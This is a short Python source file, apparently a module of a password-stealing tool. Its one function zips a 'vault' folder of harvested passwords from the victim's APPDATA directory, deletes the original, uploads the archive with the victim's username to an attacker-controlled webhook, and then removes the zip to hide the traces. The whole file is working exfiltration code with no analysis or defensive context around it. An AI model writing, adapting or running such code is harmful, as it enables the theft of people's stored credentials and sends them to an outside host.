import os, zipfile, shutil, requests, subprocess
from co.config import WEBHOOK_URL
def zipnsend():
    user = subprocess.check_output('whoami', universal_newlines=True).split('\\')[-1]
    vault_folder = os.path.join(os.getenv('APPDATA'), 'vault')
    zip_file_path = os.path.join(os.getenv('APPDATA'), 'vault.zip')
    confirm_file = os.path.join(vault_folder, 'confirmation.fullbright')

    if os.path.exists(vault_folder) and os.path.exists(confirm_file):
        try:
            with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(vault_folder):
                    for file in files:
                        zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), vault_folder))
            shutil.rmtree(vault_folder)

            with open(zip_file_path, 'rb') as f:
                response = requests.post(WEBHOOK_URL, data={'content': f'here are the passwords of the idiot named {user}:'}, files={'file': (os.path.basename(zip_file_path), f)})
                print("File sent successfully." if response.status_code == 200 else f"Error: {response.status_code}")
            os.remove(zip_file_path)
        except Exception as e:
            print(f"Error: {e}")
    else:
        return